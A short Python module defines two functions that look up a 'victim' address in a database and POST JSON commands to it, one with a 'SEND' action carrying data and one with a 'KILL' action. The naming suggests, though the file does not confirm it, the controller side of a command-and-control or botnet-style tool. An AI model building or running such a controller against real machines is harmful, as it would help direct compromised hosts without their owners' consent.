import helpers
import requests
import database

cfg = helpers.importyaml()

def send_data(clientid, victimid, data):
    victim_address = database.get_client_address(victimid)
    jsondata = {
        "source": clientid,
        "action": "SEND",
        "data": data
    }
    r = requests.post(victim_address, data=jsondata)
    return r.status_code

def send_kill(clientid, victimid, data):
    victim_address = database.get_client_address(victimid)
    jsondata = {
        "source": clientid,
        "action": "KILL",
        "data": data
    }
    r = requests.post(victim_address, data=jsondata)
    return r.status_code